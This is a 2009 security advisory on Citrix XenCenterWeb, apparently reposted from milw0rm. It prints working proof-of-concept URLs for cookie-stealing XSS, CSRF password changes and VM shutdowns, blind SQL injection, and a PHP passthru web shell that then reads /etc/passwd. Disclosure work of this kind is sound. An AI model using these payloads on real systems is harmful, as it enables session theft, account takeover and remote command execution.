@@ -1,0 +1,151 @@
+Secure Network - Security Research Advisory
+
+Vuln name: Citrix XenCenterWeb Multiple Vulnerabilities 
+Systems affected: Citrix XenCenterWeb
+Systems not affected: n/a
+Severity: High
+Local/Remote: Remote
+Vendor URL: http://www.citrix.com
+Author(s): Alberto Trivero a.trivero@securenetwork.it  -
+   Claudio Criscione c.criscione@securenetwork.it
+Vendor disclosure: 1/06/2009
+Vendor acknowledged: 11/06/2009
+Vendor patch release: n/a
+Public disclosure: 06/07/2009
+Advisory number: SN-2009-01
+Advisory URL: http://securenetwork.it/ricerca/advisory/download/SN-2009-01.txt
+
+
+*** SUMMARY ***
+
+Citrix XenCenterWeb is a web interface for Citrix XenServer environment 
+management.
+Users of XenCenterWeb will be able to see a list of Virtual Machines in the 
+Resource Pool, perform life-cycle actions (start, shutdown, restart, etc.), 
+get basic information about the hosts in the Resource Pools, information about 
+the VMs and also connect to the console of the VMs.
+
+Due to poor validation of some user controlled inputs, a variety of attacks 
+against the application and the underlying server are possible.
+Cross-site scripting, cross-site request forgery, SQL injection and remote 
+command execution attack vectors were identified as well. 
+
+XSS and CSRF attacks can be performed on the virtual appliance itself, while 
+the others require the PHP parameter magic_quotes_gpc to be off on the web 
+server.
+
+*** VULNERABILITY DETAILS ***
+
+(a) Cross-site Scripting (XSS) and Cross-site Request Forgery (CSRF)
+With the default PHP configuration (register_globals=Off and 
+magic_quotes_gpc=On), both XSS and CSRF attacks can be executed.
+
+The first XSS attack exploits the lack of sanitization in the username 
+parameter in edituser.php script and requires the victim to be able to access 
+configuration scripts: 
+https://xencenterweb.loc/config/edituser.php?username=1<script>alert(document.cookie)</script>
+
+Under the same conditions, a CSRF attack can be executed to change the 
+password of an arbitrary user:
+https://xencenterweb.loc/config/changepw.php?username=[victim_username]&newpass=[attacker's_chosen_pwd]
+
+Another CSRF attack can hard stop a VM of the attacker's choice:
+https://xencenterweb.loc/hardstopvm.php?stop_vmref=[VMref]&stop_vmname=[VMname]
+
+Other XSS vulnerabilities afflict scripts which are accessible by anyone:
+https://xencenterweb.loc/console.php?location=1"><script>alert(document.cookie)</script><"&vmname=myVM
+https://xencenterweb.loc/console.php?location=1&sessionid=1"><script>alert(123)</script><"&vmname=myVM
+https://xencenterweb.loc/console.php?location=1&sessionid=1&vmname=myVM<script>alert(123)</script>
+https://xencenterweb.loc/forcerestart.php?vmrefid=1"><script>alert(123)</script><"&vmname=myVM
+https://xencenterweb.loc/forcerestart.php?vmrefid=1&vmname=myVM"><script>alert(123)</script><"
+https://xencenterweb.loc/forcesd.php?vmrefid=1&vmname=myVM"><script>alert(123)</script><"
+https://xencenterweb.loc/forcesd.php?vmrefid=1"><script>alert(123)</script><"&vmname=myVM
+
+(b) SQL Injection
+The username parameter in the login.php script is vulnerable to a Blind SQL 
+Injection attack.
+An attacker can retrieve the whole database schema through specially crafted 
+requests.
+Here is an example proof of concept:
+https://xencenterweb.loc/login.php?username=user' UNION SELECT if(user() LIKE 
+'root@%', benchmark(1000000,sha1('test')), 'false')/*
+Obviously, other high profile attacks can be performed through this attack 
+vector.
+
+(c) Remote Command Execution
+An attacker could write arbitrary data in the file 
+/usr/local/lib/php/include/config.ini.php
+through the file /var/www/config/writeconfig.php. Due to this unsecure behavior, 
+arbitrary commands can be executed on the machine.
+If a victim with the proper authorization follows this link:
+https://xencenterweb.loc/config/writeconfig.php?pool1='; ?> <?php $cmd = 
+$_REQUEST['cmd']; passthru($cmd); ?> <?php $xen = '
+or this URL encoded version:
+https://xencenterweb.loc/config/writeconfig.php?pool1=%27%3B%20%3F%3E%20%3C%3Fphp%20%24cmd%20%3D%20%24_REQUEST%5B%27cmd%27%5D%3B%20passthru%28%24cmd%29%3B%20%3F%3E%20%3C%3Fphp%20%24xen%20%3D%20%27
+an attacker can then simply execute commands on the system through the 
+console.php file:
+https://xencenterweb.loc/console.php?cmd=cat%20/etc/passwd;
+
+
+*** EXPLOIT ***
+
+Attackers may exploit these issues through a common browser as explained 
+above.
+
+
+
+*** FIX INFORMATION ***
+
+No patch is currently provided by Citrix, and the application download has 
+been removed.
+Citrix officially stated that "the tool was created to demonstrate how the SDK 
+could be used to create unique solutions. Customers currently using it should 
+assess the risks of continued use in light of your findings and, if these prove 
+to be unacceptable, discontinue usage".
+
+
+*** WORKAROUNDS ***
+
+Common web application workarounds apply, like virtual patching from a web 
+application firewall or similar solutions. However most of the reported issues 
+can be mitigated by running the application only inside the virtual appliance 
+or in properly configured web servers.
+
+Secure Network would like to thank Citrix for its support during the 
+disclosure process.
+
+
+*********************
+*** LEGAL NOTICES ***
+*********************
+
+Secure Network (www.securenetwork.it) is an information security company, 
+which provides consulting and training services, and engages in security 
+research and development. 
+
+We are committed to open, full disclosure of vulnerabilities, cooperating
+whenever possible with software developers for properly handling disclosure.
+
+This advisory is copyright 2009 Secure Network S.r.l. Permission is 
+hereby granted for the redistribution of this alert, provided that it is
+not altered except by reformatting it, and that due credit is given. It 
+may not be edited in any way without the express consent of Secure Network 
+S.r.l. Permission is explicitly given for insertion in vulnerability 
+databases and similars, provided that due credit is given to Secure Network.
+
+The information in the advisory is believed to be accurate at the time of 
+publishing based on currently available information. This information is
+provided as-is, as a free service to the community by Secure Network 
+research staff. There are no warranties with regard to this information. 
+Secure Network does not accept any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on,
+this information.
+
+If you have any comments or inquiries, or any issue with what is reported 
+in this advisory, please inform us as soon as possible.
+
+E-mail: securenetwork {at} securenetwork.it
+GPG/PGP key: http://www.securenetwork.it/pgpkeys/Secure%20Network.asc
+Phone: +39 02 24126788
+
+# milw0rm.com [2009-07-10]
